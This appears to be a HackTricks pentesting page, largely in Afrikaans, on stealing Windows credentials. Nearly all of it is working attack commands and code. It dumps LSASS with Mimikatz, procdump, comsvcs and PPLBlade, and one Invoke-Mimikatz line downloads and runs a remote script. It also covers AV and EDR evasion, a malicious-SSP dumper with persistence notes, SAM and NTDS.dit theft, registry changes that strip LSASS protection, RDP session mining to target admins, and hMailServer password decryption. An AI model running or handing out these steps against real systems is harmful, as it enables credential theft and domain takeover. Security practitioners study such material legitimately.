# Diefstal van Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen op** [**this page**](credentials-mimikatz.md)**.

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Hierdie beskermings kan verhoed dat Mimikatz sekere credentials onttrek.**

## Credentials met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **na passwords en hashes te soek** binne die slagoffer.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omseiling van AV

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n legitieme Microsoft-instrument is**, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie instrument gebruik om **dump the lsass process**, **download the dump** en **extract** die **credentials locally** van die dump.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Let wel**: Sommige **AV** mag die gebruik van **procdump.exe to dump lsass.exe** as **kwaadwillig** **bespeur**, dit is omdat hulle die string **"procdump.exe" and "lsass.exe"** **bespeur**. Dit is dus **meer heimlik** om as **argument** die **PID** van lsass.exe aan procdump **deur te gee** **in plaas van** die **naam lsass.exe.**

### Dumping lsass with **comsvcs.dll**

'n DLL met die naam **comsvcs.dll** wat in `C:\Windows\System32` gevind word, is verantwoordelik vir **dumping process memory** in die geval van 'n crash. Hierdie DLL sluit 'n **funksie** genaamd **`MiniDumpW`** in, bedoel om met `rundll32.exe` aangeroep te word.\
Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een is in drie komponente verdeel. Die proses-ID wat gegooi moet word vorm die eerste komponent, die dump-lêer ligging verteenwoordig die tweede, en die derde komponent is streng die woord **full**. Geen alternatiewe opsies bestaan nie.\
Sodra hierdie drie komponente ontleed is, gaan die DLL voort om die dump-lêer te skep en die gespesifiseerde proses se geheue in hierdie lêer oor te dra.\
Die gebruik van **comsvcs.dll** is bruikbaar vir die dumping van die lsass-proses, en verwyder dus die behoefte om procdump op te laai en uit te voer. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Die volgende opdrag word gebruik vir uitvoering:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **lsass uittrek met Taakbestuurder**

1. Regsklik op die Taakbalk en klik op Taakbestuurder
2. Klik op Meer besonderhede
3. Soek na die "Local Security Authority Process" proses in die Prozesse-oortjie
4. Regsklik op die "Local Security Authority Process" proses en klik op "Create dump file".

### lsass uittrek met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n deur Microsoft-ondertekende binêre wat deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Protected Process Dumper Tool wat obfuscating memory dump ondersteun en die oordrag daarvan na remote workstations toelaat sonder om dit op die disk te los.

**Belangrike funksies**:

1. Omseil PPL-beskerming
2. Obfuskering van memory dump-lêers om Defender se signature-based detection-meganismes te omseil
3. Upload van memory dump met RAW- en SMB-uploadmetodes sonder om dit op die disk te los (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping sonder MiniDumpWriteDump

Ink Dragon lewer 'n driedelige dumper met die naam **LalsDumper** wat nooit `MiniDumpWriteDump` aanroep nie, sodat EDR hooks op daardie API nooit geaktiveer word:

1. **Stage 1 loader (`lals.exe`)** – soek in `fdp.dll` na 'n plaasvervanger wat uit 32 klein-letter `d` karakters bestaan, oorskryf dit met die absolute pad na `rtu.txt`, stoor die gepatchte DLL as `nfdp.dll`, en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die kwaadwillige DLL as 'n nuwe Security Support Provider (SSP) te laai.
2. **Stage 2 inside LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XORs elke byte met `0x20`, en map die gedekodeerde blob in geheue voordat dit uitvoering oordra.
3. **Stage 3 dumper** – die gemapte payload herimplementeer MiniDump-logika met behulp van **direct syscalls** opgelos vanaf gehashte API-name (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). 'n toegewyde export genaamd `Tom` maak `%TEMP%\<pid>.ddt` oop, stream 'n gecomprimeerde LSASS dump na die lêer, en sluit die handle sodat exfiltration later kan plaasvind.

Operator notas:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll`, en `rtu.txt` in dieselfde gids. Fase 1 skryf die hard-gekodeerde plaasvervanger oor met die absolute pad na `rtu.txt`, dus sal dit die ketting breek as jy dit opsplits.
* Registrasie gebeur deur `nfdp` by te voeg by `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Jy kan daardie waarde self instel om LSASS te laat herlaai die SSP by elke opstart.
* `%TEMP%\*.ddt` lêers is gecomprimeerde dumps. Ontkomprimeer plaaslik, en voer hulle dan aan Mimikatz/Volatility vir credential extraction.
* Om `lals.exe` te laat loop benodig admin/SeTcb-regte sodat `AddSecurityPackageA` suksesvol kan wees; sodra die oproep terugkeer, laai LSASS deursigtig die kwaadwillige SSP en voer Stage 2 uit.
* Om die DLL van die skyf te verwyder verwyder dit nie uit LSASS nie. Of skuif die registerinskrywing uit en herbegin LSASS (reboot) of laat dit vir langtermyn persistentie.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit vanaf teiken DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump die NTDS.dit wagwoordgeskiedenis vanaf target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wys die pwdLastSet-attribuut vir elke NTDS.dit-rekening
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Steel SAM & SYSTEM

Hierdie lêers behoort **geleë** te wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan dit nie net op 'n gewone manier kopieer nie**, omdat hulle beskerm word.

### Vanaf die Register

Die maklikste manier om daardie lêers te steel, is om 'n kopie uit die register te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laai daardie lêers op jou Kali-masjien af** en **onttrek die hashes** met behulp van:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan kopieë van beskermde lêers maak met hierdie diens. Jy moet Administrator wees.

#### Using vssadmin

Die vssadmin binary is slegs beskikbaar in Windows Server-weergawes
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde vanaf **Powershell** doen. Dit is 'n voorbeeld van **how to copy the SAM file** (die hardeskyf wat gebruik word is "C:" en dit is gestoor in C:\users\Public) maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory**, en bevat kritieke data oor user objects, groups, en hul lidmaatskappe. Dit is waar die **password hashes** vir domeingebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** database en lê by **_%SystemRoom%/NTDS/ntds.dit_**.

Binne hierdie databasis word drie primêre tabelle onderhou:

- **Data Table**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objekte soos users en groups.
- **Link Table**: Dit hou verhoudings by, soos group memberships.
- **SD Table**: **Security descriptors** vir elke objek word hier gehou, wat die sekuriteit en toegangbeheer vir die gestoorde objekte verseker.

Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. 'n **Gedeelte** van die **NTDS.dit**-lêer kan dus in die **`lsass`**-geheue gevind wees (jy kan waarskynlik die mees onlangse benaderde data vind as gevolg van prestasieverbetering deur gebruik van 'n **kas**).

#### Ontsleuteling van die hashes binne NTDS.dit

Die hash is 3 keer geënkripteer:

1. Ontsleutel Password Encryption Key (**PEK**) met die **BOOTKEY** en **RC4**.
2. Ontsleutel die **hash** met **PEK** en **RC4**.
3. Ontsleutel die **hash** met **DES**.

**PEK** het dieselfde waarde in **elke domain controller**, maar dit is binne die **NTDS.dit**-lêer **gesifrer** met die **BOOTKEY** van die **SYSTEM**-lêer van die domain controller (dit verskil tussen domain controllers). Daarom, om die credentials uit die NTDS.dit-lêer te kry, **het jy die lêers NTDS.dit en SYSTEM nodig** (_C:\Windows\System32\config\SYSTEM_).

### Kopieer NTDS.dit met Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system) truuk gebruik om die **ntds.dit** lêer te kopieer. Onthou dat jy ook 'n kopie van die **SYSTEM file** nodig sal hê (weer, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) truuk).

### **Hashes uit NTDS.dit uittrek**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** verkry het, kan jy gereedskap soos _secretsdump.py_ gebruik om die **hashes uit te trek**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan hulle ook **outomaties onttrek** deur 'n geldige domain admin user te gebruik:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit-lêers** word dit aanbeveel om dit uit te trek met [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Laastens kan jy ook die **metasploit module** gebruik: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Uittrekking van domeinvoorwerpe uit NTDS.dit na 'n SQLite-databasis**

NTDS-voorwerpe kan met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) na 'n SQLite-databasis uitgehaal word. Nie net secrets word uitgehaal nie, maar ook die volledige voorwerpe en hul attribuute vir verdere inligtingsekstraksie wanneer die rou NTDS.dit-lêer reeds verkry is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive is optional maar maak ontsleuteling van geheime moontlik (NT & LM hashes, supplemental credentials soos cleartext passwords, Kerberos- of trust-sleutels, NT & LM wagwoordgeskiedenisse). Saam met ander inligting word die volgende data onttrek: gebruikers- en masjienrekeninge met hul hashes, UAC flags, tydstempel vir laaste aanmelding en wagwoordverandering, rekeningsbeskrywing, name, UPN, SPN, groepe en rekursiewe lidmaatskappe, organisatoriese eenhede-boom en lidmaatskap, vertroude domeine met trust-tipe, rigting en attributte...

## Lazagne

Laai die binary af vanaf [here](https://github.com/AlessandroZ/LaZagne/releases). Jy kan hierdie binary gebruik om credentials uit verskeie software te onttrek.
```
lazagne.exe all
```
## Ander gereedskap om credentials uit SAM en LSASS te onttrek

### Windows credentials Editor (WCE)

Hierdie hulpmiddel kan gebruik word om credentials uit die geheue te onttrek. Laai dit af vanaf: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Trek credentials uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Haal credentials uit die SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) en voer dit net **uit**, en die wagwoorde sal onttrek word.

## Mynbou van inaktiewe RDP-sessies en verswakking van sekuriteitskontroles

Ink Dragon’s FinalDraft RAT sluit `DumpRDPHistory` tasker in waarvan die tegnieke handig is vir enige red-teamer:

### DumpRDPHistory-style telemetrie-insameling

* **Uitgaande RDP-teikens** – ontleed elke gebruikers-hive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke subkey stoor die servernaam, `UsernameHint`, en die laaste skryftydstempel. Jy kan FinalDraft se logika met PowerShell repliseer:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inkomende RDP-bewyse** – navraag doen by die `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log vir Event IDs **21** (suksesvolle aanmelding) en **25** (verbreking) om te karteer wie die box geadministreer het:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (met LalsDumper/Mimikatz) terwyl hul **ontkoppelde** sessie nog bestaan. CredSSP + NTLM fallback laat hul verifier en tokens in LSASS agter, wat dan oor SMB/WinRM gespeel kan word om `NTDS.dit` te haal of om persistence op domain controllers te plaas.

### Register-afgraderings geteiken deur FinalDraft

Die selfde implantaat manipuleer ook verskeie register-sleutels om credential theft makliker te maak:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Instelling `DisableRestrictedAdmin=1` dwing volledige hergebruik van kredensiale/tickets tydens RDP af, en skakel pass-the-hash-styl pivots in.
* `LocalAccountTokenFilterPolicy=1` skakel UAC-tokenfiltrering uit sodat plaaslike admins onbeperkte tokens oor die netwerk kry.
* `DSRMAdminLogonBehavior=2` laat die DSRM administrateur aanmeld terwyl die DC aanlyn is, wat aanvalers nog 'n ingeboude hoë-privilege rekening gee.
* `RunAsPPL=0` verwyder LSASS PPL-beskermings, wat geheue-toegang triviëel maak vir dumpers soos LalsDumper.

## hMailServer database credentials (post-compromise)

hMailServer stoor sy DB-wagwoord in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` onder `[Database] Password=`. Die waarde is Blowfish-geënkripteer met die statiese sleutel `THIS_KEY_IS_NOT_SECRET` en 4-byt-woord endianness-wisselings. Gebruik die hex string uit die INI met hierdie Python snippet:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Met die onversleutelde wagwoord, kopieer die SQL CE-databasis om lêerslotte te voorkom, laai die 32-bit provider, en voer indien nodig 'n opgradering uit voordat jy hashes navraag doen:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die `accountpassword` kolom gebruik die hMailServer hash format (hashcat mode `1421`). Cracking hierdie waardes kan herbruikbare credentials vir WinRM/SSH pivots verskaf.
## Verwysings

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
